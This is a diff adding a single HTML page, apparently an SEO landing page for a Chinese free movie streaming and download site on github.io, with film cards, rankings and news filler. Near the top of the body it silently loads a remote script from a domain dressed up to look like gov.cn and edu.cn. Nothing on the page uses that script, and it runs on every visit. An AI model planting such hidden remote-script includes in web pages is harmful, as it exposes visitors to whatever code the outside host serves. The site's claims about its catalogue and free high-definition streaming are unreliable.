@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>迅雷哥电影网 | 高清影视在线观看与资源下载平台</title>
+<meta name="keywords" content="迅雷哥电影网,电影在线观看,高清影视资源,迅雷下载,免费电影网">
+<meta name="description" content="迅雷哥电影网——专注高清影视在线观看与极速资源下载，汇集院线大片、热播剧集、经典老片，每日更新，畅享视听盛宴。">
+<meta name="author" content="迅雷哥电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xunleigedianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0c10;--bg2:#11141b;--card:#161a23;--line:#262d3a;
+  --txt:#e8eaed;--sub:#9aa3b2;--brand:#ff3b5c;--brand2:#ff7a59;
+  --gold:#f5c518;--radius:14px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",Roboto,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+
+/* 顶部进度条 */
+#topBar{position:fixed;top:0;left:0;height:3px;width:0;z-index:9999;
+  background:linear-gradient(90deg,var(--brand),var(--gold));transition:width .2s}
+
+/* 导航 */
+.header{position:sticky;top:0;z-index:100;background:rgba(10,12,16,.92);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{max-width:1200px;margin:0 auto;padding:0 16px;display:flex;align-items:center;gap:20px}
+.logo{font-size:22px;font-weight:900;letter-spacing:.5px;padding:14px 0;flex-shrink:0;
+  background:linear-gradient(135deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo span{color:var(--gold)}
+.logo small{display:block;font-size:10px;font-weight:400;letter-spacing:2px;color:var(--sub);
+  -webkit-text-fill-color:var(--sub);margin-top:-4px}
+.menu{flex:1;display:flex;gap:6px;overflow-x:auto}
+.menu a{padding:20px 12px;font-size:15px;color:var(--sub);white-space:nowrap;position:relative;transition:.2s}
+.menu a:hover{color:var(--txt)}
+.menu a.active{color:var(--brand)}
+.menu a.active::after{content:"";position:absolute;left:12px;right:12px;bottom:12px;height:2px;background:var(--brand);border-radius:2px}
+.search{flex-shrink:0;display:flex;align-items:center;background:var(--bg2);border:1px solid var(--line);
+  border-radius:20px;padding:5px 5px 5px 14px;width:200px}
+.search input{border:0;background:transparent;color:var(--txt);outline:0;font-size:13px;width:100%}
+.search button{border:0;background:var(--brand);color:#fff;border-radius:14px;padding:5px 12px;font-size:12px;cursor:pointer}
+.menuBtn{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.menuBtn i{width:22px;height:2px;background:var(--txt);border-radius:2px}
+
+/* 通用容器 */
+.wrap{max-width:1200px;margin:0 auto;padding:0 16px}
+section{padding:44px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:22px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;font-weight:800;position:relative;padding-left:14px}
+.sec-head h2::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:5px;border-radius:3px;
+  background:linear-gradient(var(--brand),var(--gold))}
+.sec-head a{font-size:13px;color:var(--sub)}
+.sec-head a:hover{color:var(--brand)}
+
+/* Hero */
+.hero{position:relative;padding:70px 0 50px;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:-20% -10% auto -10%;height:420px;
+  background:radial-gradient(ellipse at 30% 30%,rgba(255,59,92,.28),transparent 60%),
+  radial-gradient(ellipse at 75% 20%,rgba(245,197,24,.15),transparent 55%);z-index:0}
+.hero .wrap{position:relative;z-index:1}
+.hero h1{font-size:38px;line-height:1.25;font-weight:900;margin-bottom:16px;max-width:720px}
+.hero h1 em{font-style:normal;background:linear-gradient(120deg,var(--brand),var(--gold));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--sub);max-width:600px;font-size:15px;margin-bottom:26px}
+.hStat{display:flex;gap:36px;flex-wrap:wrap;margin-bottom:30px}
+.hStat div b{display:block;font-size:28px;font-weight:900;color:var(--gold)}
+.hStat div span{font-size:12px;color:var(--sub)}
+.hBtns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:13px 28px;border-radius:30px;font-size:15px;
+  font-weight:700;cursor:pointer;border:0;transition:.25s}
+.btn-main{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(255,59,92,.4)}
+.btn-ghost{background:transparent;color:var(--txt);border:1.5px solid var(--line)}
+.btn-ghost:hover{border-color:var(--brand);color:var(--brand)}
+
+/* 分类标签 */
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+.tag{padding:6px 16px;border-radius:20px;font-size:13px;background:var(--bg2);border:1px solid var(--line);color:var(--sub);cursor:pointer;transition:.2s}
+.tag:hover{border-color:var(--brand);color:var(--txt)}
+.tag.on{background:var(--brand);border-color:var(--brand);color:#fff}
+
+/* 卡片网格 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:18px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;
+  transition:.28s;cursor:pointer}
+.card:hover{transform:translateY(-6px);border-color:var(--brand)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden}
+.thumb img{width:100%;height:100%;object-fit:cover;transition:.5s}
+.card:hover .thumb img{transform:scale(1.08)}
+.score{position:absolute;top:8px;right:8px;background:rgba(0,0,0,.75);color:var(--gold);
+  font-size:12px;font-weight:800;padding:2px 7px;border-radius:6px;backdrop-filter:blur(4px)}
+.ep{position:absolute;top:8px;left:8px;background:rgba(255,59,92,.92);color:#fff;
+  font-size:11px;padding:2px 7px;border-radius:6px}
+.thumb .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  background:rgba(0,0,0,.35);opacity:0;transition:.3s}
+.card:hover .thumb .play{opacity:1}
+.thumb .play::after{content:"";width:46px;height:46px;border-radius:50%;background:rgba(255,255,255,.92);
+  box-shadow:0 0 0 8px rgba(255,255,255,.18)}
+.thumb .play::before{content:"";position:absolute;width:0;height:0;border-left:13px solid var(--brand);
+  border-top:8px solid transparent;border-bottom:8px solid transparent;left:calc(50% + 2px)}
+.info{padding:11px 12px}
+.info h4{font-size:14px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.info p{font-size:12px;color:var(--sub);margin-top:3px}
+
+/* 剧集 - 横排 */
+.grid-h{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
+.card-h{display:flex;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;padding:10px;transition:.28s;cursor:pointer}
+.card-h:hover{transform:translateY(-4px);border-color:var(--brand)}
+.card-h .thumb{width:110px;flex-shrink:0;aspect-ratio:3/4;border-radius:8px}
+.card-h .info{padding:4px 4px}
+.card-h .info h4{font-size:15px;white-space:normal;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
+  white-space:normal;overflow:hidden}
+.badge{display:inline-block;font-size:11px;padding:1px 7px;border-radius:5px;margin:6px 0;background:rgba(245,197,24,.15);color:var(--gold)}
+
+/* 榜单 */
+.rankBox{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:20px}
+.rank{border:1px solid var(--line);border-radius:var(--radius);padding:18px;background:var(--card)}
+.rank h3{font-size:16px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.rank h3 i{font-style:normal;font-size:12px;background:var(--bg2);padding:2px 8px;border-radius:10px;color:var(--sub);font-weight:400}
+.rk{display:flex;align-items:center;gap:12px;padding:9px 0;border-bottom:1px dashed var(--line)}
+.rk:last-child{border:0}
+.rk b{font-size:18px;font-weight:900;color:var(--line);width:22px;flex-shrink:0}
+.rk:nth-child(1) b,.rk:nth-child(2) b,.rk:nth-child(3) b{color:var(--brand)}
+.rk .t{flex:1;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rk .v{font-size:12px;color:var(--sub)}
+
+/* 资讯列表 */
+.news{display:grid;grid-template-columns:1.4fr 1fr;gap:24px}
+.newsMain{border-radius:var(--radius);overflow:hidden;min-height:300px;position:relative}
+.newsMain img{width:100%;height:100%;position:absolute;inset:0;object-fit:cover}
+.newsMain .mask{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.92),transparent 60%)}
+.newsMain .ct{position:absolute;left:20px;right:20px;bottom:20px}
+.newsMain .ct span{font-size:12px;color:var(--gold)}
+.newsMain .ct h4{font-size:19px;margin-top:6px}
+.newsList li{padding:14px 0;border-bottom:1px solid var(--line);display:flex;gap:10px;align-items:flex-start}
+.newsList li:last-child{border:0}
+.newsList .n{font-size:12px;color:var(--brand);flex-shrink:0;padding-top:3px}
+.newsList p{flex:1;font-size:14px}
+.newsList p small{display:block;color:var(--sub);font-size:12px;margin-top:3px}
+
+/* 关于 */
+.about{background:linear-gradient(135deg,var(--card),var(--bg2));border:1px solid var(--line);border-radius:var(--radius);padding:34px}
+.about h2{font-size:22px;margin-bottom:14px}
+.about p{color:var(--sub);margin-bottom:12px}
+.feat{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-top:24px}
+.feat div{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:18px}
+.feat div h5{font-size:15px;margin-bottom:6px;color:var(--gold)}
+.feat div p{font-size:13px;color:var(--sub);margin:0}
+
+/* 页脚 */
+.footer{border-top:1px solid var(--line);padding:40px 0 24px;background:var(--bg2)}
+.fGrid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:28px;margin-bottom:28px}
+.fGrid h5{font-size:15px;margin-bottom:14px}
+.fGrid p,.fGrid a{font-size:13px;color:var(--sub)}
+.fLinks a{display:block;padding:4px 0}
+.fLinks a:hover{color:var(--brand)}
+.copy{font-size:12px;color:#6b7280;text-align:center;border-top:1px solid var(--line);padding-top:20px}
+.copy a{color:var(--brand)}
+
+/* 返回顶部 */
+.toTop{position:fixed;right:18px;bottom:22px;width:42px;height:42px;border-radius:50%;background:var(--brand);
+  display:flex;align-items:center;justify-content:center;cursor:pointer;opacity:0;pointer-events:none;
+  transition:.3s;z-index:99;box-shadow:0 6px 18px rgba(255,59,92,.4)}
+.toTop.show{opacity:1;pointer-events:auto}
+.toTop::before{content:"";width:10px;height:10px;border-top:3px solid #fff;border-left:3px solid #fff;transform:rotate(45deg);margin-top:4px}
+
+/* 响应式 */
+@media(max-width:860px){
+  .search{display:none}
+  .menuBtn{display:flex}
+  .menu{display:none;position:absolute;top:100%;left:0;right:0;background:var(--bg2);
+    flex-direction:column;padding:10px;border-bottom:1px solid var(--line)}
+  .menu.open{display:flex}
+  .menu a{padding:12px 20px}
+  .hero h1{font-size:26px}
+  .hStat{gap:22px}
+  .hStat div b{font-size:22px}
+  .grid{grid-template-columns:repeat(3,1fr);gap:12px}
+  .grid-h,.rankBox{grid-template-columns:1fr}
+  .news{grid-template-columns:1fr}
+  .fGrid{grid-template-columns:1fr 1fr;gap:20px}
+  .card-h .thumb{width:90px}
+}
+@media(max-width:520px){
+  .grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .info h4{font-size:13px}
+  .hero{padding:46px 0 32px}
+  .btn{padding:11px 22px;font-size:14px}
+  section{padding:32px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div id="topBar"></div>
+
+<header class="header">
+  <div class="nav">
+    <div class="logo">迅雷哥电影网<small>XUNLEIGE FILM</small></div>
+    <nav class="menu" id="menu">
+      <a href="#home" class="active">首页</a>
+      <a href="#film">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#rank">榜单</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="search"><input type="text" placeholder="搜索影片..."><button>搜索</button></div>
+    <div class="menuBtn" id="menuBtn"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <h1>迅雷哥电影网 · <em>海量高清影视</em>，一站畅看院线大片与热播好剧</h1>
+    <p>聚合院线新片、经典老片、高分剧集，每日实时更新。极速播放、高清画质、无广告打扰，随时随地开启你的私人影院时光。</p>
+    <div class="hStat">
+      <div><b>18,600+</b><span>收录影片</span></div>
+      <div><b>4K</b><span>高清画质</span></div>
+      <div><b>365</b><span>全年无休更新</span></div>
+      <div><b>0</b><span>弹窗广告</span></div>
+    </div>
+    <div class="hBtns">
+      <a href="#film"><button class="btn btn-main">立即免费观看</button></a>
+      <a href="#about"><button class="btn btn-ghost">了解平台</button></a>
+    </div>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section id="film">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热门电影</h2>
+      <div class="tags" data-group="film">
+        <span class="tag on">全部</span><span class="tag">动作</span><span class="tag">喜剧</span>
+        <span class="tag">科幻</span><span class="tag">悬疑</span><span class="tag">爱情</span><span class="tag">动画</span>
+      </div>
+      <a href="#">更多 ›</a>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m1/300/400" alt="沙丘：觉醒">
+          <span class="score">9.2</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>沙丘：觉醒</h4><p>科幻 · 2026 · 美国</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m2/300/400" alt="逆光追凶">
+          <span class="score">8.6</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>逆光追凶</h4><p>犯罪悬疑 · 2026</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m3/300/400" alt="云端恋人">
+          <span class="score">8.1</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>云端恋人</h4><p>爱情 · 2026</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m4/300/400" alt="钢铁之心">
+          <span class="score">8.8</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>钢铁之心</h4><p>动作 · 2026 · 好莱坞</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m5/300/400" alt="山海奇谭">
+          <span class="score">8.4</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>山海奇谭</h4><p>动画 · 2026 · 国产</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m6/300/400" alt="爆笑家族">
+          <span class="score">7.9</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>爆笑家族</h4><p>喜剧 · 2026</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m7/300/400" alt="深海密码">
+          <span class="score">8.3</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>深海密码</h4><p>冒险 · 2026</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><img src="https://picsum.photos/seed/m8/300/400" alt="岁月如歌">
+          <span class="score">8.7</span>
+          <div class="play"></div>
+        </div>
+        <div class="info"><h4>岁月如歌</h4><p>剧情 · 2026</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集 -->
+<section id="tv" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.015),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热播剧集</h2>
+      <div class="tags" data-group="tv">
+        <span class="tag on">全部</span><span class="tag">大陆</span><span class="tag">美剧</span>
+        <span class="tag">韩剧</span><span class="tag">日剧</span><span class="tag">港剧</span>
+      </div>
+      <a href="#">更多 ›</a>
+    </div>
+    <div class="grid-h">
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t1/300/400" alt="长安十二时辰">
+          <span class="ep">更新至32集</span></div>
+        <div class="info"><span class="badge">古装 · 悬疑</span>
+          <h4>长安十二时辰：盛世迷局</h4><p>唐朝上元节前夕，死囚与少年名将为拯救长安，展开惊心动魄的十二时辰。</p></div>
+      </div>
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t2/300/400" alt="权力的代价">
+          <span class="ep">全10集</span></div>
+        <div class="info"><span class="badge">美剧 · 史诗</span>
+          <h4>权力的代价 第四季</h4><p>家族恩怨再度升级，王座之争背后隐藏着更深的阴谋与背叛。</p></div>
+      </div>
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t3/300/400" alt="初次见面">
+          <span class="ep">更新至16集</span></div>
+        <div class="info"><span class="badge">韩剧 · 都市爱情</span>
+          <h4>初次见面，请多关照</h4><p>契约婚姻牵出一段甜蜜又心酸的都市爱情故事，治愈指数满分。</p></div>
+      </div>
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t4/300/400" alt="东京夜行">
+          <span class="ep">全12集</span></div>
+        <div class="info"><span class="badge">日剧 · 犯罪</span>
+          <h4>东京夜行</h4><p>深夜出租车司机的镜头下，是这座城市最真实的人情冷暖与离奇案件。</p></div>
+      </div>
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t5/300/400" alt="医者仁心">
+          <span class="ep">更新至28集</span></div>
+        <div class="info"><span class="badge">国产 · 医疗</span>
+          <h4>医者仁心 2026</h4><p>急诊科医护人员在生死边缘与时间赛跑，演绎一幕幕感人至深的生命故事。</p></div>
+      </div>
+      <div class="card-h">
+        <div class="thumb"><img src="https://picsum.photos/seed/t6/300/400" alt="风云岁月">
+          <span class="ep">全40集</span></div>
+        <div class="info"><span class="badge">港剧 · 年代</span>
+          <h4>风云岁月</h4><p>从六十年代走到千禧年，三代人的创业沉浮见证香港的时代变迁。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 榜单 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影视排行榜</h2>
+      <a href="#">完整榜单 ›</a>
+    </div>
+    <div class="rankBox">
+      <div class="rank">
+        <h3>🔥 热播电影榜 <i>WEEKLY</i></h3>
+        <div class="rk"><b>1</b><span class="t">沙丘：觉醒</span><span class="v">9.2分</span></div>
+        <div class="rk"><b>2</b><span class="t">钢铁之心</span><span class="v">8.8分</span></div>
+        <div class="rk"><b>3</b><span class="t">岁月如歌</span><span class="v">8.7分</span></div>
+        <div class="rk"><b>4</b><span class="t">逆光追凶</span><span class="v">8.6分</span></div>
+        <div class="rk"><b>5</b><span class="t">深海密码</span><span class="v">8.3分</span></div>
+        <div class="rk"><b>6</b><span class="t">山海奇谭</span><span class="v">8.4分</span></div>
+      </div>
+      <div class="rank">
+        <h3>📺 热播剧集榜 <i>WEEKLY</i></h3>
+        <div class="rk"><b>1</b><span class="t">长安十二时辰：盛世迷局</span><span class="v">9.4分</span></div>
+        <div class="rk"><b>2</b><span class="t">医者仁心 2026</span><span class="v">9.0分</span></div>
+        <div class="rk"><b>3</b><span class="t">权力的代价 第四季</span><span class="v">8.9分</span></div>
+        <div class="rk"><b>4</b><span class="t">风云岁月</span><span class="v">8.5分</span></div>
+        <div class="rk"><b>5</b><span class="t">初次见面，请多关照</span><span class="v">8.6分</span></div>
+        <div class="rk"><b>6</b><span class="t">东京夜行</span><span class="v">8.3分</span></div>
+      </div>
+      <div class="rank">
+        <h3>⭐ 经典高分榜 <i>ALL TIME</i></h3>
+        <div class="rk"><b>1</b><span class="t">肖申克的救赎</span><span class="v">9.7分</span></div>
+        <div class="rk"><b>2</b><span class="t">阿甘正传</span><span class="v">9.5分</span></div>
+        <div class="rk"><b>3</b><span class="t">霸王别姬</span><span class="v">9.6分</span></div>
+        <div class="rk"><b>4</b><span class="t">星际穿越</span><span class="v">9.4分</span></div>
+        <div class="rk"><b>5</b><span class="t">这个杀手不太冷</span><span class="v">9.4分</span></div>
+        <div class="rk"><b>6</b><span class="t">千与千寻</span><span class="v">9.4分</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯 -->
+<section id="news" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.015),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影视资讯</h2>
+      <a href="#">资讯首页 ›</a>
+    </div>
+    <div class="news">
+      <div class="newsMain">
+        <img src="https://picsum.photos/seed/n1/700/500" alt="2026国庆档前瞻">
+        <div class="mask"></div>
+        <div class="ct"><span>🎬 特别策划</span>
+          <h4>2026国庆档前瞻：十二部新片扎堆上映，谁能拿下票房冠军？</h4>
+        </div>
+      </div>
+      <ul class="newsList">
+        <li><span class="n">01</span><p>第79届戛纳电影节完整片单公布，华语片入围主竞赛单元<small>2小时前 · 电影</small></p></li>
+        <li><span class="n">02</span><p>《沙丘：觉醒》全球票房突破8亿美元，续集已立项<small>4小时前 · 票房</small></p></li>
+        <li><span class="n">03</span><p>知名导演新作开机，全明星阵容引发期待<small>昨天 · 幕后</small></p></li>
+        <li><span class="n">04</span><p>经典老片4K修复版上线，重温光影里的黄金年代<small>昨天 · 修复</small></p></li>
+        <li><span class="n">05</span><p>流媒体格局再变，多家平台宣布内容合作计划<small>2天前 · 行业</small></p></li>
+        <li><span class="n">06</span><p>本周口碑榜出炉，这三部冷门佳作不容错过<small>2天前 · 推荐</small></p></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <h2>关于迅雷哥电影网</h2>
+      <p>迅雷哥电影网（xunleigedianyingwang-zh.github.io）是一个专注于高清影视在线观看与资源检索的平台，致力于为广大影迷提供便捷、快速、流畅的观影体验。</p>
+      <p>网站每日同步更新院线新片、热播剧集、经典老片与高分动画，覆盖动作、喜剧、科幻、悬疑、爱情、动画等多种类型，无论你钟爱哪种风格，都能在这里找到心仪之作。</p>
+      <div class="feat">
+        <div><h5>🎞️ 海量片库</h5><p>收录影片超万部，类型齐全，持续扩充中。</p></div>
+        <div><h5>⚡ 极速加载</h5><p>智能线路调度，秒开播放，告别漫长等待。</p></div>
+        <div><h5>📱 多端适配</h5><p>手机、平板、电脑全平台自适应，随时观看。</p></div>
+        <div><h5>🔔 每日更新</h5><p>院线同步、剧集跟播，新鲜内容不断档。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="wrap">
+    <div class="fGrid">
+      <div>
+        <h5>迅雷哥电影网</h5>
+        <p>专注高清影视在线观看，每日更新院线大片与热播剧集，让你的每一段闲暇时光都有好片相伴。</p>
+      </div>
+      <div class="fLinks">
+        <h5>栏目导航</h5>
+        <a href="#home">网站首页</a>
+        <a href="#film">电影频道</a>
+        <a href="#tv">剧集频道</a>
+        <a href="#rank">影视榜单</a>
+      </div>
+      <div class="fLinks">
+        <h5>影片分类</h5>
+        <a href="#">动作片</a>
+        <a href="#">喜剧片</a>
+        <a href="#">科幻片</a>
+        <a href="#">悬疑片</a>
+      </div>
+      <div class="fLinks">
+        <h5>关于本站</h5>
+        <a href="#about">平台介绍</a>
+        <a href="#">联系我们</a>
+        <a href="#">使用帮助</a>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 迅雷哥电影网 版权所有 · 网站网址：https://xunleigedianyingwang-zh.github.io<br>
+      本站内容仅供影视信息交流与个人学习使用，相关版权归原作者及发行方所有。
+    </div>
+  </div>
+</footer>
+
+<div class="toTop" id="toTop"></div>
+
+<script>
+// 移动端菜单
+var menuBtn=document.getElementById('menuBtn'),menu=document.getElementById('menu');
+menuBtn.addEventListener('click',function(){menu.classList.toggle('open')});
+menu.addEventListener('click',function(e){if(e.target.tagName==='A')menu.classList.remove('open')});
+
+// 导航高亮
+var links=document.querySelectorAll('.menu a');
+var secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var pos=window.scrollY+120,idx=0;
+  secs.forEach(function(s,i){if(s.offsetTop<=pos)idx=i});
+  links.forEach(function(a,i){a.classList.toggle('active',i===idx)});
+});
+
+// 标签切换
+document.querySelectorAll('.tag').forEach(function(t){
+  t.addEventListener('click',function(){
+    var g=this.parentElement;
+    g.querySelectorAll('.tag').forEach(function(x){x.classList.remove('on')});
+    this.classList.add('on');
+  });
+});
+
+// 返回顶部 + 进度条
+var bar=document.getElementById('topBar'),topBtn=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=(h>0?(window.scrollY/h*100):0)+'%';
+  topBtn.classList.toggle('show',window.scrollY>400);
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
